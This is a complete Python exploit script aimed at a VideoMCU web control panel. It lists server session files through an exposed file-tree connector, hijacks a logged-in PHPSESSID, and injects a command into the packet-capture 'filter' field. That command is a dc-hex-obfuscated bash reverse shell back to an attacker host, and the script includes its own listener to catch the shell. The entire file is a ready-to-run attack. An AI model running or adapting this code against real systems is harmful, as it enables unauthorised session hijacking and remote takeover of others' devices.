#!/usr/bin/env python3
import requests
import sys
import telnetlib
import socket
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import binascii
import time 
import re

def handler(lp): # handler borrowed from Stephen Seeley.
    print(f"[+] starting handler on port {lp}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[*] Got connection from {addr[0]}")
    t.sock = conn
    print("[$] Shell popped :P")
    t.interact()



def do_login(base_url, session_value):
    login_url = base_url + "/index.php"
    session = requests.Session()
    cookie = f"PHPSESSID={session_value}"
    headers = {"Cookie": cookie}
    try:
        print("[+] Attempting to log into VideoMCU...")
        f = session.post(url=login_url, headers=headers, verify=False, allow_redirects=False)
    except:
        print("[-] oh no it went wrong, sorry, good luck debugging")
        sys.exit(0)
    if (f.status_code == 302 and f.headers['Location'] == '/SAFe/sng_control_panel'):
        print("[*] Logged in?")
        return True
    else:
        return False


def grab_sessions(base_url):
    print("[+] Attempting to list the sessions directory...")
    target_url = base_url + '/SAFe/js/jqueryFileTree/connectors/jqueryFileTree.php'    
    data = {'dir': '/var/webconfig/tmp/'}
    try:
        r = requests.post(url=target_url, data=data, verify=False)
    except:
        sys.exit("[-] Failed to grab the directory listing...")
    if "sess_" in r.text: 
        print("[*] Found some sessions...")
    else:
        sys.exit("[-] No sessions found!")
    possible_sessions = []
    # everything past here is a horrible mistake
    blah = re.findall(r"<a\s+(?:[^>]*?\s+)?rel=([\"'])(.*?)\1", r.text)
    for x in blah:
        if "sess" in x[1]:
            session_path = x[1]
            session = session_path.split("_")[1]
            possible_sessions.append(session)
    print(f"[*] Got {len(possible_sessions)} sessions to try...")
    return possible_sessions            


def do_remote_exec(base_url, session_value, command):
    target_url = base_url + '/admin/sng_capture.php'
    injection = f"$({command})"
    exploit_data = {"filter": injection,
                    "interface": "eth0",
                    "capture-eth": "Capture"}
    cookie = f"PHPSESSID={session_value}"
    headers = {"Referer": target_url, 'Cookie': cookie}
    exp = requests.post(url=target_url, data=exploit_data, headers=headers, verify=False)

def dc_encoder(reverse_shell):
    hexadecimals = binascii.hexlify(reverse_shell.encode('ascii'))
    hexadecimals = hexadecimals.upper()
    wrapper = f"echo '16i {hexadecimals.decode('ascii')} P' | dc | sh"
    print(wrapper)
    return wrapper

def exp(base_url, cb_host, cb_port):
    # everything beyond this point needs to be refactored
    print(f"[*] Using {cb_host}:{cb_port} for connectback...")
    handlerthr = Thread(target=handler, args=(int(cb_port),))
    handlerthr.start()
    sessions = grab_sessions(base_url=base_url)
    if len(sessions) > 0:
        pass
    else:
        sys.exit("[-] No sessions to hijack, sorry!")
    for session_value in sessions:
        session = do_login(base_url, session_value)
        if session is True:
            print("[+] Got what looks to be a valid session...")
            print("[+] Well, we made it this far...")
            print(session_value)
            print("[*] We made it this far and seem to have a valid session...")
            reverse_shell = f"nohup bash -c 'bash -i >& /dev/tcp/{cb_host}/{cb_port} 0>&1 &'"
            encoded_reverse_shell = dc_encoder(reverse_shell)
            print("[+] Doing the command injection...")
            do_remote_exec(base_url, session_value, encoded_reverse_shell)
            break
        else:
            print("[-] Invalid, next...")

def main(args):
    if len(args) != 4:
        sys.exit("use: %s https://some-videomcu.lol:81 hacke.rs 1337 username password" %(args[0]))
    exp(base_url=args[1], cb_host=args[2], cb_port=args[3])

if __name__ == "__main__":
    main(args=sys.argv)
